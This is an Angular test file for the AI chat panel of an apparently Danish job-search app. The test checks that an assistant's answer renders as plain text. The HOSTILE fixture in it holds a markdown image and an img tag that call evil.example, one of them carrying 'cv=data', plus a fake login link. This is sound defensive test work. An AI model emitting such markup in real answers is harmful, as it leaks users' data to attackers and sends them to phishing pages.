import { ComponentFixture, TestBed } from '@angular/core/testing';
import { By } from '@angular/platform-browser';
import { provideHttpClient, withXhr } from '@angular/common/http';
import { HttpTestingController, provideHttpClientTesting } from '@angular/common/http/testing';
import { Router, provideRouter } from '@angular/router';
import { TranslateModule } from '@ngx-translate/core';
import { ChatPanelComponent } from './chat-panel.component';
import { ChatStore } from '../../../core/chat/chat.store';
import { ChatMessage } from '../../../core/models/chat.model';
import { BuddyComponent } from '../buddy/buddy.component';

const HOSTILE = 'Se mere: ![x](https://evil.example/?cv=data) <img src="https://evil.example/p">'
  + ' [klik](https://evil.example/login)';

const ANSWER: ChatMessage = {
  role: 'ASSISTANT',
  text: HOSTILE,
  at: '2026-11-21T10:00:00Z',
  actions: [
    { kind: 'OPEN_POSTING', postings: [{ id: 'j1', title: 'Rådgiver', company: 'Arla' }] },
    { kind: 'STEP_THROUGH', postings: [
      { id: 'j2', title: 'Redaktør', company: 'Coop' },
      { id: 'j3', title: 'Konsulent', company: 'Netto' },
    ] },
  ],
};

describe('ChatPanelComponent', () => {
  let panel: HTMLElement;
  let navigate: jasmine.Spy;
  let fixture: ComponentFixture<ChatPanelComponent>;
  let backend: HttpTestingController;
  let store: ChatStore;

  beforeEach(() => {
    TestBed.configureTestingModule({
      imports: [ChatPanelComponent, TranslateModule.forRoot()],
      providers: [provideRouter([]), provideHttpClient(withXhr()), provideHttpClientTesting()],
    });
    navigate = spyOn(TestBed.inject(Router), 'navigate').and.resolveTo(true);
    backend = TestBed.inject(HttpTestingController);
    store = TestBed.inject(ChatStore);
    fixture = TestBed.createComponent(ChatPanelComponent);
    fixture.detectChanges();
    backend.expectOne(r => r.method === 'GET' && r.url === '/api/v1/chats').flush([]);
    store.open('c1');
    backend.expectOne(r => r.method === 'GET' && r.url === '/api/v1/chats/c1/messages').flush({
      messages: [{ role: 'USER', text: 'Find opslag', at: ANSWER.at }, ANSWER], contextLost: false,
    });
    fixture.componentInstance.open.set(true);
    fixture.detectChanges();
    panel = fixture.nativeElement as HTMLElement;
  });

  function actionButtons(): HTMLButtonElement[] {
    return Array.from(panel.querySelectorAll<HTMLButtonElement>('[data-chat-action]'));
  }

  it('shows an answer as plain text, so it can neither load an image nor link away', () => {
    expect(panel.textContent).toContain('![x](https://evil.example/?cv=data)');
    expect(panel.querySelector('section img')).toBeNull();
    expect(panel.querySelector('section a')).toBeNull();
  });

  it('offers each button with the app own label and the posting it is about', () => {
    const buttons = actionButtons();

    expect(buttons.map(b => b.getAttribute('data-chat-action'))).toEqual(['OPEN_POSTING', 'STEP_THROUGH']);
    expect(buttons[0].textContent).toContain('chat.actions.OPEN_POSTING');
    expect(buttons[0].textContent).toContain('Rådgiver');
  });

  it('goes nowhere until she clicks, then opens the posting', () => {
    expect(navigate).not.toHaveBeenCalled();

    actionButtons()[0].click();

    expect(navigate).toHaveBeenCalledWith(['/jobs', 'j1']);
  });

  it('starts stepping through the postings in the order given', () => {
    actionButtons()[1].click();

    expect(navigate).toHaveBeenCalledWith(['/jobs', 'j2']);
  });

  it('has the launcher Buddy think while a turn runs and react to how it ended', () => {
    const launcher = () => fixture.debugElement.query(By.css('[data-chat-launcher] jb-buddy'))
      .componentInstance as BuddyComponent;
    expect(launcher().mood()).toBe('idle');

    store.send('Hej');
    fixture.detectChanges();
    expect(launcher().mood()).toBe('thinking');

    backend.expectOne(r => r.method === 'POST' && r.url === '/api/v1/chats/c1/messages')
      .flush('event:delta\ndata:{"text":"Svar"}\n\nevent:done\ndata:{}\n\n');
    backend.expectOne(r => r.method === 'GET' && r.url === '/api/v1/chats').flush([]);
    fixture.detectChanges();
    expect(launcher().mood()).toBe('cheer');

    store.send('Igen');
    backend.expectOne(r => r.method === 'POST' && r.url === '/api/v1/chats/c1/messages')
      .flush('event:error\ndata:{"code":"NOT_LOGGED_IN"}\n\n');
    fixture.detectChanges();
    expect(launcher().mood()).toBe('error');
  });
});
